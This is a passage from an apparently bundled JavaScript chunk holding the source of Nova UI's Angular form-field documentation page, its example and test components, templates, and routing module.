<code>nui-validation-message</code></b>\n</p>\n<nui-example-wrapper\n    filenamePrefix="basic-reactive-form-field-custom-validation"\n    exampleTitle="Custom Styled Validation Messages Inside Reactive Form"\n>\n    <nui-form-field-basic-reactive-custom-validation-example></nui-form-field-basic-reactive-custom-validation-example>\n</nui-example-wrapper>\n\n<h2>Compound Validation</h2>\n\n<p>\n    In the example below an example of a compound validation can be seen. To\n    validate group of fields you need to find the first common parent FormGroup\n    and add validator there (click "Source" above and open the TS tab to see the\n    <code>matchPassword</code> validator).\n</p>\n<p>\n    The current validation state of the form is displayed at the bottom of the\n    example.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="form-field-complex"\n    exampleTitle="Form Field with custom validation"\n>\n    <nui-form-field-complex-example></nui-form-field-complex-example>\n</nui-example-wrapper>\n\n<h2>HTML as info</h2>\n\n<p>\n    There is a possibility to have additional information to each field. It can\n    be done using either <code>info</code> input, that is just a text, passed as\n    a string, or <code>infoTemplate</code> input, that uses html inside the\n    <code>ng-template</code>. Note: the template is provided completely by the\n    user and we do not do any sanitizing.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="html-as-info-in-form-field"\n    exampleTitle="HTML inside popover"\n>\n    <nui-form-field-with-html-example></nui-form-field-with-html-example>\n</nui-example-wrapper>\n\n<h2>Hint Text</h2>\n\n<p>\n    Hint text can give the user additional information about a form field and\n    will appear below the field\'s user input area. The text for a hint can be\n    specified in one of two ways: either by setting the\n    <code>{{ getItemConfigKey("hint") }}</code> input with a string value or by\n    providing a templateRef through the\n    <code>{{ getItemConfigKey("hintTemplate") }}</code> input.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="form-field-hint"\n    exampleTitle="Form Field Hints"\n>\n    <nui-form-field-hint-basic-example></nui-form-field-hint-basic-example>\n</nui-example-wrapper>\n\n<h2>Dynamic Disabling</h2>\n\n<p>\n    Example to show possibility of controlling disabled state (setting initial,\n    dynamic change of state).\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="form-field-dynamic-disabling"\n    exampleTitle="Form Field with dynamic disabling"\n>\n    <nui-form-field-dynamic-disabling-example></nui-form-field-dynamic-disabling-example>\n</nui-example-wrapper>\n\n<h2>Nested Form Components</h2>\n\n<p>\n    In order to avoid code duplication, it may be useful to combine a form from\n    several components. In this example there is a Form Group that consists of\n    Nickname control an 2 child Form Groups represented by separate components:\n    one is for personal data (name, surname) called\n    <code>nui-first-custom-form-example</code> and another is for address (city,\n    address) called <code>nui-second-custom-form-example</code>. In order to\n    achieve that we need to let the parent form know that there are some child\n    groups that should be appended. This is done by calling\n    <code>formInitialized</code> method from the parent form group on the event\n    <code>formReady</code> of the child. Also there is a\n    <code>CustomFormFieldExampleComponent</code> from previous example reused in\n    child components to illustrate even more flexibility of this approach.\n</p>\n<p>\n    The current validation state of the form is displayed at the bottom of the\n    example.\n</p>\n<p>\n    Note that there are several ways to use components as a form group, but this\n    is currently the most convenient way.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="nested-forms-as-component"\n    exampleTitle="Nested form components"\n>\n    <nui-nested-forms-as-component-example></nui-nested-forms-as-component-example>\n</nui-example-wrapper>\n\n<h2>Various Components in a Form</h2>\n\n<p>This example shows all possible inputs combined in one form</p>\n\n<nui-example-wrapper\n    filenamePrefix="in-form-form-field"\n    exampleTitle="Form Field inside the Form"\n>\n    <nui-form-field-in-form-example></nui-form-field-in-form-example>\n</nui-example-wrapper>\n\n<h2>Validation Triggering</h2>\n\n<p>\n    This example shows all possible ways for validation message triggering by\n    touch, value changes or status changes event.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="form-field-validation-triggering"\n    exampleTitle="Form Field Validation Triggering"\n>\n    <nui-form-field-validation-triggering-example></nui-form-field-validation-triggering-example>\n</nui-example-wrapper>\n'},91562:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\nimport { FormFieldComponent } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-form-field-docs-example",\n    templateUrl: "./form-field-docs.example.component.html",\n})\nexport class FormFieldExampleComponent {\n    getItemConfigKey(key: keyof FormFieldComponent): string {\n        return key;\n    }\n}\n'},18522:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-form-field\n    caption="This caption is generic for all form fields"\n    i18n-caption\n    info="Some info to show"\n    i18n-info\n    hint="Hint may be useful"\n    i18n-hint\n    id="nui-demo-form-field"\n>\n    \x3c!-- ngIf added for the QA to verify that there\'s no "expression changed after it has been checked" error --\x3e\n    <nui-textbox *ngIf="true"></nui-textbox>\n    <nui-validation-message [show]="true" i18n\n        >Some error message</nui-validation-message\n    >\n</nui-form-field>\n\n<form [formGroup]="dynamicForm">\n    <button\n        id="nui-form-field-test-toggle-disable-state-button"\n        nui-button\n        type="button"\n        (click)="toggleDisabledState()"\n    >\n        Toggle Disabled State\n    </button>\n\n    <nui-form-field\n        caption="Textbox"\n        i18n-caption\n        [control]="dynamicForm.controls[\'textbox\']"\n    >\n        \x3c!-- ngIf added for the QA to verify that there\'s no "expression changed after it has been checked" error --\x3e\n        <nui-textbox\n            *ngIf="true"\n            id="nui-form-field-test-textbox"\n            formControlName="textbox"\n        ></nui-textbox>\n        <nui-validation-message for="required" i18n>\n            This is required\n        </nui-validation-message>\n    </nui-form-field>\n\n    <nui-form-field\n        caption="Textbox Number"\n        i18n-caption\n        [control]="dynamicForm.controls[\'textboxNumber\']"\n    >\n        \x3c!-- ngIf added for the QA to verify that there\'s no "expression changed after it has been checked" error --\x3e\n        <nui-textbox-number\n            *ngIf="true"\n            id="nui-form-field-test-textbox-number"\n            formControlName="textboxNumber"\n        ></nui-textbox-number>\n        <nui-validation-message for="required" i18n>\n            This is required\n        </nui-validation-message>\n    </nui-form-field>\n\n    <nui-form-field\n        caption="Switch"\n        i18n-caption\n        [control]="dynamicForm.controls[\'switch\']"\n    >\n        \x3c!-- ngIf added for the QA to verify that there\'s no "expression changed after it has been checked" error --\x3e\n        <nui-switch\n            *ngIf="true"\n            id="nui-form-field-test-switch"\n            formControlName="switch"\n        ></nui-switch>\n    </nui-form-field>\n\n    <nui-form-field\n        caption="Radio Group"\n        i18n-caption\n        [control]="dynamicForm.controls[\'radio\']"\n    >\n        \x3c!-- ngIf added for the QA to verify that there\'s no "expression changed after it has been checked" error --\x3e\n        <nui-radio-group\n            *ngIf="true"\n            id="nui-form-field-test-radio"\n            formControlName="radio"\n        >\n            <nui-radio ariaLabel="Radio">Radio</nui-radio>\n        </nui-radio-group>\n    </nui-form-field>\n\n    <nui-form-field\n        caption="Checkbox"\n        i18n-caption\n        [control]="dynamicForm.controls[\'checkbox\']"\n    >\n        \x3c!-- ngIf added for the QA to verify that there\'s no "expression changed after it has been checked" error --\x3e\n        <nui-checkbox\n            *ngIf="true"\n            formControlName="checkbox"\n            id="nui-form-field-test-checkbox"\n            >Checkbox</nui-checkbox\n        >\n    </nui-form-field>\n\n    <nui-form-field\n        caption="Checkbox Group"\n        i18n-caption\n        [control]="dynamicForm.controls[\'checkboxGroup\']"\n    >\n        \x3c!-- ngIf added for the QA to verify that there\'s no "expression changed after it has been checked" error --\x3e\n        <nui-checkbox-group\n            *ngIf="true"\n            id="nui-form-field-test-checkbox-group"\n            formControlName="checkboxGroup"\n        >\n            <nui-checkbox\n                *ngFor="let vegetable of vegetables"\n                [ariaLabel]="vegetable"\n                [value]="vegetable"\n                >{{ vegetable }}\n            </nui-checkbox>\n        </nui-checkbox-group>\n    </nui-form-field>\n\n    <nui-form-field\n        caption="Datepicker"\n        i18n-caption\n        [control]="dynamicForm.controls[\'datepicker\']"\n    >\n        \x3c!-- ngIf added for the QA to verify that there\'s no "expression changed after it has been checked" error --\x3e\n        <nui-date-picker\n            *ngIf="true"\n            id="nui-form-field-test-datepicker"\n            formControlName="datepicker"\n            [inline]="false"\n        ></nui-date-picker>\n    </nui-form-field>\n\n    <nui-form-field\n        caption="Timepicker"\n        i18n-caption\n        [control]="dynamicForm.controls[\'timepicker\']"\n    >\n        \x3c!-- ngIf added for the QA to verify that there\'s no "expression changed after it has been checked" error --\x3e\n        <nui-time-picker\n            *ngIf="true"\n            id="nui-form-field-test-timepicker"\n            formControlName="timepicker"\n        ></nui-time-picker>\n    </nui-form-field>\n\n    <nui-form-field\n        caption="Date Time Picker"\n        hint="Some pretty long text with hint. Longer than previous even. This text should not ellipsify."\n        info="text"\n        [control]="dynamicForm.controls[\'dateTimePicker\']"\n    >\n        \x3c!-- ngIf added for the QA to verify that there\'s no "expression changed after it has been checked" error --\x3e\n        <nui-date-time-picker\n            *ngIf="true"\n            id="nui-form-field-test-datetimepicker"\n            formControlName="dateTimePicker"\n        >\n        </nui-date-time-picker>\n        <nui-validation-message>\n            This field is required\n        </nui-validation-message>\n    </nui-form-field>\n    <span id="nui-form-field-test-datetimepicker-model">\n        {{ dateTimePickerModel }}\n    </span>\n\n    <nui-form-field\n        caption="SelectV2"\n        i18n-caption\n        [control]="dynamicForm.controls[\'selectV2\']"\n    >\n        \x3c!-- ngIf added for the QA to verify that there\'s no "expression changed after it has been checked" error --\x3e\n        <nui-select-v2\n            *ngIf="true"\n            formControlName="selectV2"\n            id="nui-form-field-test-select"\n        >\n            <nui-select-v2-option\n                *ngFor="let item of [\'orange\', \'apple\']"\n                [value]="item"\n                >{{ item }}</nui-select-v2-option\n            >\n        </nui-select-v2>\n    </nui-form-field>\n\n    <nui-form-field\n        caption="ComboboxV2"\n        i18n-caption\n        [control]="dynamicForm.controls[\'comboboxV2\']"\n    >\n        \x3c!-- ngIf added for the QA to verify that there\'s no "expression changed after it has been checked" error --\x3e\n        <nui-combobox-v2\n            *ngIf="true"\n            formControlName="comboboxV2"\n            id="nui-form-field-test-combobox"\n        >\n            <nui-select-v2-option\n                *ngFor="let item of [\'orange\', \'apple\']"\n                [value]="item"\n                >{{ item }}</nui-select-v2-option\n            >\n        </nui-combobox-v2>\n    </nui-form-field>\n</form>\n\n<nui-form-field\n    caption="This caption is generic for all form fields"\n    i18n-caption\n    [infoTemplate]="template"\n    hint="Hint may be useful"\n    i18n-hint\n    id="nui-demo-form-field-with-template"\n>\n    \x3c!-- ngIf added for the QA to verify that there\'s no "expression changed after it has been checked" error --\x3e\n    <nui-textbox *ngIf="true"></nui-textbox>\n    <nui-validation-message [show]="true" i18n\n        >Some error message</nui-validation-message\n    >\n</nui-form-field>\n<ng-template #template>\n    <a>Template with link</a>\n</ng-template>\n\n<nui-form-field\n    caption="This caption is generic for all form fields"\n    i18n-caption\n    [hintTemplate]="hintTemplate"\n    id="nui-demo-form-field-hint-with-template"\n>\n    \x3c!-- ngIf added for the QA to verify that there\'s no "expression changed after it has been checked" error --\x3e\n    <nui-textbox *ngIf="true"></nui-textbox>\n</nui-form-field>\n\n<ng-template #hintTemplate>\n    <a href="" [routerLink]="[]" i18n>Hint template</a>\n</ng-template>\n'},5830:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, OnInit } from "@angular/core";\nimport { FormBuilder, Validators } from "@angular/forms";\nimport moment from "moment/moment";\n\n@Component({\n    selector: "nui-form-field-test",\n    templateUrl: "./form-field-test.component.html",\n})\nexport class FormFieldTestComponent implements OnInit {\n    public dynamicForm;\n\n    public dateTimePickerModel: string;\n    public vegetables = [\n        $localize`Cabbage`,\n        $localize`Potato`,\n        $localize`Tomato`,\n        $localize`Carrot`,\n    ];\n\n    constructor(private formBuilder: FormBuilder) {\n        this.dynamicForm = this.formBuilder.group({\n            textbox: this.formBuilder.control("", Validators.required),\n            textboxNumber: this.formBuilder.control("", Validators.required),\n            radio: this.formBuilder.control({}, Validators.required),\n            checkbox: this.formBuilder.control(true, Validators.required),\n            checkboxGroup: this.formBuilder.control("", Validators.required),\n            switch: this.formBuilder.control(true, Validators.required),\n            selectV2: this.formBuilder.control("apple", Validators.required),\n            comboboxV2: this.formBuilder.control("apple", Validators.required),\n            datepicker: this.formBuilder.control(moment(), Validators.required),\n            timepicker: this.formBuilder.control({}, Validators.required),\n            dateTimePicker: this.formBuilder.control(\n                moment("04/09/1989", "L"),\n                [\n                    // "L" is "MM/DD/YYY" in moment.js\n                    Validators.required,\n                ]\n            ),\n        });\n    }\n\n    public ngOnInit(): void {\n        this.dynamicForm.disable();\n        this.dynamicForm.valueChanges.subscribe(\n            (value) =>\n                (this.dateTimePickerModel = moment(value.dateTimePicker).format(\n                    "LLLL"\n                ))\n        );\n    }\n\n    public toggleDisabledState(): void {\n        if (this.dynamicForm.disabled) {\n            this.dynamicForm.enable();\n        } else {\n            this.dynamicForm.disable();\n        }\n    }\n}\n'},59140:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<form [formGroup]="reactiveForm">\n    <nui-form-field\n        class="d-block mb-4"\n        caption="Email address"\n        i18n-caption\n        hint="Try to change value or remove everything"\n        i18n-hint\n        [control]="reactiveForm.controls[\'email\']"\n    >\n        <nui-textbox formControlName="email" type="email"></nui-textbox>\n        <nui-validation-message for="required" i18n>\n            This is required\n        </nui-validation-message>\n        <nui-validation-message for="email" i18n>\n            This should be a valid email\n        </nui-validation-message>\n    </nui-form-field>\n</form>\n<div class="btn-group">\n    <button nui-button type="button" (click)="onAddValidators()" i18n>\n        Add Validators\n    </button>\n    <button nui-button type="button" (click)="onTouch()" i18n>Touch</button>\n    <button nui-button type="button" (click)="onValueChange()" i18n>\n        Value Change\n    </button>\n    <button nui-button type="button" (click)="onStatusChange()" i18n>\n        Status Change\n    </button>\n    <button nui-button type="button" (click)="onReset()" i18n>Reset</button>\n</div>\n'},23140:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport { FormBuilder, Validators } from "@angular/forms";\n\n@Component({\n    selector: "nui-form-field-validation-triggering-example",\n    templateUrl: "./form-field-validation-triggering.example.component.html",\n})\nexport class FormFieldValidationTriggeringxampleComponent {\n    public reactiveForm;\n\n    constructor(private formBuilder: FormBuilder) {\n        this.reactiveForm = this.formBuilder.group({\n            email: this.formBuilder.control(""),\n        });\n    }\n\n    public onAddValidators(): void {\n        this.reactiveForm\n            .get("email")\n            ?.setValidators([Validators.required, Validators.email]);\n    }\n\n    public onTouch(): void {\n        if (\n            this.reactiveForm.get("email")?.value === "" &&\n            this.reactiveForm.get("email")?.errors === null &&\n            this.reactiveForm.get("email")?.validator\n        ) {\n            this.reactiveForm.get("email")?.setErrors({ required: true });\n        }\n        this.reactiveForm.get("email")?.markAsTouched();\n    }\n\n    public onValueChange(): void {\n        const text =\n            this.reactiveForm.get("email")?.value === ""\n                ? "some text here"\n                : "";\n        this.reactiveForm.get("email")?.setValue(text);\n    }\n\n    public onStatusChange(): void {\n        const errors = this.reactiveForm.valid ? { hasError: true } : null;\n        this.reactiveForm.get("email")?.setErrors(errors);\n    }\n\n    public onReset(): void {\n        this.reactiveForm.get("email")?.reset("");\n        this.reactiveForm.get("email")?.setErrors(null);\n        this.reactiveForm.get("email")?.setValidators(null);\n    }\n}\n'},81834:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <h3>Nested form components</h3>\n    <form [formGroup]="fancyForm" class="nui-edge-definer">\n        <nui-form-field\n            caption="Nickname"\n            hint="Some pretty long text with hint"\n            info="text"\n            [control]="fancyForm.controls[\'nickname\']"\n        >\n            <nui-textbox\n                formControlName="nickname"\n                id="nui-form-field-visual-test-nickname"\n            ></nui-textbox>\n            <nui-validation-message for="required">\n                This is required\n            </nui-validation-message>\n        </nui-form-field>\n        <nui-form-field caption="City" [control]="fancyForm.controls[\'city\']">\n            <nui-textbox\n                formControlName="city"\n                id="nui-form-field-visual-test-city"\n            ></nui-textbox>\n        </nui-form-field>\n    </form>\n    <h3>Custom error message styling</h3>\n    <form [formGroup]="fancyForm">\n        <nui-form-field\n            i18n-caption\n            caption="Textbox"\n            i18n-hint\n            hint="Try to leave empty this required field"\n            [control]="fancyForm.controls[\'textbox\']"\n        >\n            <nui-textbox formControlName="textbox" type="textbox"></nui-textbox>\n\n            <nui-custom-validation-message for="required">\n                <nui-icon\n                    icon="status_critical"\n                    iconSize="small"\n                    aria-hidden="true"\n                ></nui-icon>\n                <span class="ml-1"><em i18n>This is required</em></span>\n            </nui-custom-validation-message>\n        </nui-form-field>\n    </form>\n    <h3>Various Components in a Form</h3>\n    <form [formGroup]="fancyForm" class="nui-edge-definer">\n        <div class="row">\n            <div class="col">\n                <nui-form-field\n                    caption="Textbox"\n                    hint="This should be any valid email"\n                    info="text"\n                    [control]="fancyForm.controls[\'textbox\']"\n                >\n                    <nui-textbox\n                        id="nui-form-field-visual-test-textbox"\n                        formControlName="textbox"\n                    ></nui-textbox>\n                    <nui-validation-message for="required">\n                        This field is required\n                    </nui-validation-message>\n                    <nui-validation-message for="email">\n                        Something, but not enough\n                    </nui-validation-message>\n                </nui-form-field>\n            </div>\n            <div class="col">\n                <nui-form-field\n                    id="nui-form-field-visual-test-form-field"\n                    caption="Checkbox"\n                    hint="Some pretty long text with hint"\n                    info="text"\n                    [control]="fancyForm.controls[\'checkbox\']"\n                >\n                    <nui-checkbox\n                        id="nui-form-field-visual-test-checkbox"\n                        formControlName="checkbox"\n                    ></nui-checkbox>\n                    <nui-validation-message for="required">\n                        This field is required\n                    </nui-validation-message>\n                </nui-form-field>\n            </div>\n            <div class="col">\n                <nui-form-field\n                    caption="Switch"\n                    hint="Some pretty long text with hint"\n                    info="text"\n                    [control]="fancyForm.controls[\'switch\']"\n                >\n                    <nui-switch\n                        id="nui-form-field-visual-test-switch"\n                        formControlName="switch"\n                    ></nui-switch>\n                    <nui-validation-message for="required">\n                        This field is required\n                    </nui-validation-message>\n                </nui-form-field>\n            </div>\n            <hr />\n        </div>\n        <div class="row">\n            <div class="col">\n                <nui-form-field\n                    caption="Checkbox Group"\n                    hint="Some pretty long text with hint"\n                    info="text"\n                    [control]="fancyForm.controls[\'checkboxGroup\']"\n                >\n                    <nui-checkbox-group\n                        id="nui-form-field-visual-test-checkbox-group"\n                        formControlName="checkboxGroup"\n                        name="vegetable"\n                    >\n                        <nui-checkbox\n                            *ngFor="let vegetable of vegetables"\n                            [value]="vegetable"\n                        >\n                            {{ vegetable }}\n                        </nui-checkbox>\n                    </nui-checkbox-group>\n                    <nui-validation-message for="required">\n                        This field is required\n                    </nui-validation-message>\n                </nui-form-field>\n            </div>\n            <div class="col">\n                <nui-form-field\n                    caption="Radio Group"\n                    hint="Some pretty long text with hint"\n                    info="text"\n                    [control]="fancyForm.controls[\'radioGroup\']"\n                >\n                    <nui-radio-group\n                        id="nui-form-field-visual-test-radio"\n                        formControlName="radioGroup"\n                        name="vegetable"\n                        required\n                    >\n                        <nui-radio\n                            *ngFor="let vegetable of vegetables"\n                            [value]="vegetable"\n                        >\n                            {{ vegetable }}\n                        </nui-radio>\n                    </nui-radio-group>\n                    <nui-validation-message for="required">\n                        This field is required\n                    </nui-validation-message>\n                </nui-form-field>\n            </div>\n            <hr />\n        </div>\n        <div class="row">\n            <div class="col">\n                <nui-form-field\n                    caption="Combobox"\n                    hint="Some pretty long text with hint"\n                    info="text"\n                    [control]="fancyForm.controls[\'combobox\']"\n                >\n                    <nui-combobox\n                        id="nui-form-field-visual-test-combobox"\n                        formControlName="combobox"\n                        [itemsSource]="vegetables"\n                    ></nui-combobox>\n                    <nui-validation-message for="required">\n                        This field is required\n                    </nui-validation-message>\n                </nui-form-field>\n            </div>\n            <div class="col">\n                <nui-form-field\n                    caption="Select"\n                    hint="Some pretty long text with hint"\n                    info="text"\n                    [control]="fancyForm.controls[\'select\']"\n                >\n                    <nui-select\n                        id="nui-form-field-visual-test-select"\n                        formControlName="select"\n                        [itemsSource]="vegetables"\n                    ></nui-select>\n                    <nui-validation-message for="required">\n                        This field is required\n                    </nui-validation-message>\n                </nui-form-field>\n            </div>\n            <div class="col">\n                <nui-form-field\n                    caption="Time Picker"\n                    hint="Some pretty long text with hint"\n                    info="text"\n                    [control]="fancyForm.controls[\'timePicker\']"\n                >\n                    <nui-time-picker\n                        id="nui-form-field-visual-test-timepicker"\n                        formControlName="timePicker"\n                    ></nui-time-picker>\n                    <nui-validation-message for="required">\n                        This field is required\n                    </nui-validation-message>\n                </nui-form-field>\n            </div>\n        </div>\n        <div class="my-3 d-flex flex-row justify-content-center">\n            <div>\n                <button\n                    nui-button\n                    class="btn"\n                    id="nui-demo-mark-as-touched-button"\n                    (click)="markAsDirty()"\n                >\n                    Mark as Dirty\n                </button>\n            </div>\n        </div>\n        <div class="d-flex flex-row justify-content-center">\n            <div class="w-100 d-flex flex-column">\n                <pre>fancyForm.valid = {{ fancyForm.valid }}</pre>\n                <pre>fancyForm.dirty = {{ fancyForm.dirty }}</pre>\n            </div>\n        </div>\n    </form>\n</div>\n'},46166:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport { FormBuilder, Validators } from "@angular/forms";\n\n@Component({\n    selector: "nui-form-field-visual-test",\n    templateUrl: "./form-field-visual-test.component.html",\n})\nexport class FormFieldVisualTestComponent {\n    public fancyForm;\n\n    public vegetables = ["Cabbage", "Potato", "Tomato", "Carrot"];\n\n    constructor(private formBuilder: FormBuilder) {\n        this.fancyForm = this.formBuilder.group({\n            nickname: this.formBuilder.control("", [\n                Validators.required,\n                Validators.min(3),\n            ]),\n            city: this.formBuilder.control(""),\n            textbox: this.formBuilder.control("", [Validators.required]),\n            checkbox: this.formBuilder.control(false, [\n                Validators.requiredTrue,\n            ]),\n            checkboxGroup: this.formBuilder.control("", [Validators.required]),\n            radioGroup: this.formBuilder.control(null, [Validators.required]),\n            switch: this.formBuilder.control(false, [Validators.requiredTrue]),\n            select: this.formBuilder.control("", [Validators.required]),\n            combobox: this.formBuilder.control("", [Validators.required]),\n            timePicker: this.formBuilder.control("", [Validators.required]),\n        });\n    }\n\n    markAsDirty(): void {\n        Object.keys(this.fancyForm.controls).forEach((key) => {\n            this.fancyForm.get(key)?.markAsDirty();\n            this.fancyForm.get(key)?.updateValueAndValidity();\n        });\n    }\n}\n'},66687:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { FormsModule, ReactiveFormsModule } from "@angular/forms";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiButtonModule,\n    NuiCheckboxModule,\n    NuiDatePickerModule,\n    NuiDateTimePickerModule,\n    NuiDocsModule,\n    NuiFormFieldModule,\n    NuiIconModule,\n    NuiRadioModule,\n    NuiSelectModule,\n    NuiSelectV2Module,\n    NuiSwitchModule,\n    NuiTextboxModule,\n    NuiTimePickerModule,\n    NuiValidationMessageModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport { FormFieldBasicHintExampleComponent } from "./basic-hint/form-field-hint.example.component";\nimport { FormFieldBasicReactiveCustomValidationExampleComponent } from "./basic-reactive/basic-reactive-form-field-custom-validation.example.component";\nimport {\n    FirstCustomFormExampleComponent,\n    FormFieldBasicExampleComponent,\n    FormFieldBasicReactiveExampleComponent,\n    FormFieldComplexExampleComponent,\n    FormFieldDynamicDisablingExampleComponent,\n    FormFieldExampleComponent,\n    FormFieldInFormExampleComponent,\n    FormFieldTestComponent,\n    FormFieldValidationTriggeringxampleComponent,\n    FormFieldVisualTestComponent,\n    FormFieldWithHTMLExampleComponent,\n    NestedFormsAsComponentExampleComponent,\n    SecondCustomFormExampleComponent,\n} from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: FormFieldExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "form-field-test",\n        component: FormFieldTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "form-field-visual-test",\n        component: FormFieldVisualTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: 